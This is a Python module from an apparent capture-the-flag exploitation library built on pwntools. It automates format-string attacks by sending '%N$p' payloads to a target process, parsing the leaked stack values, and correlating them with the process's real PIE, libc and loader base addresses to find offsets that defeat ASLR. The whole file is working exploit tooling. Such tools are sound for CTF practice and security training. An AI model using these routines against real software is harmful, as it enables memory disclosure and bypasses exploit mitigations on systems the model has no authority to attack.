from typing import Callable, Union, List, Tuple, Optional

import pwnlib.tubes.process

from ctflib.pwn.util import get_pie_base, get_libc_base, get_ld_base, SetupFunction, SendFunction


def read_stack(p: pwnlib.tubes.process.process, sf: SendFunction, indexes: List[int]) -> List[int]:
    payload = []
    for i in indexes:
        payload.append(f"%{i}$p")
    payload = "ZZ" + "".join(payload) + "ZZ"
    res = sf(p, payload)
    for line in res.split(b"\n"):
        if b"ZZ" in line:
            returned_string = line.split(b"ZZ")[1].split(b"ZZ")[0]
            returned_string = returned_string.replace(b"(nil)",b"0x0")
            ret = [int(x, 16) for x in returned_string.split(b"0x") if len(x)> 0]
            assert len(ret) == len(
                indexes), "Returned item length does not match index length. Batch size probably too high"
            return ret
    raise Exception("Process did not echo sent data. Perhaps echoed data is not within 30 lines of output")


def dump_stack(setup: SetupFunction, sf: SendFunction, max_input_length: Union[None, int] = None,
               offset: int = 6, until: int = 30) -> List[int]:
    if max_input_length is None:
        batch_size = 3
    else:
        batch_size = max_input_length // 10
    output = []
    for i in range(offset, until, batch_size):
        p = setup()
        out = read_stack(p, sf, [x for x in range(i, i + batch_size)])
        if not out:
            output.extend([None] * batch_size)
        else:
            output.extend(out)
        p.close()
    return output

def __leak_base(setup: SetupFunction, sf: SendFunction, func: Callable[[int], int], max_input_length: Union[None, int] = None,
                offset: int = 6, until: int = 30) -> Optional[List[Tuple[int, int]]]:
    if max_input_length is None:
        batch_size = 3
    else:
        batch_size = max_input_length // 10
    print(f"Batch size: {batch_size}")
    output = [[], []]
    for j in range(2):
        for i in range(offset, until, batch_size):
            p = setup()
            y = func(p.pid)
            out = read_stack(p, sf, [x for x in range(i, i + batch_size)])
            if out:
                for item in out:
                    output[j].append((item, y))
    def sub(a, b):
        return a - b

    out = []
    for i in range(len(output[0])):
        run1 = sub(*output[0][i])
        run2 = sub(*output[1][i])
        if run1 == run2:
            out += [(i + offset, -run1)]
    return out


def leak_pie_base(setup: SetupFunction, sf: SendFunction, max_input_length: Union[None, int] = None,
                   offset: int = 6, until: int = 30) -> Optional[List[Tuple[int, int]]]:
    return __leak_base(setup, sf, get_pie_base, max_input_length, offset, until)


def leak_libc_base(setup: SetupFunction, sf: SendFunction, max_input_length: Union[None, int] = None,
                   offset: int = 6, until: int = 30) -> Optional[List[Tuple[int, int]]]:
    return __leak_base(setup, sf, get_libc_base, max_input_length, offset, until)

def leak_ld_base(setup: SetupFunction, sf: SendFunction, max_input_length: Union[None, int] = None,
                   offset: int = 6, until: int = 30) -> Optional[List[Tuple[int, int]]]:
    return __leak_base(setup, sf, get_ld_base, max_input_length, offset, until)
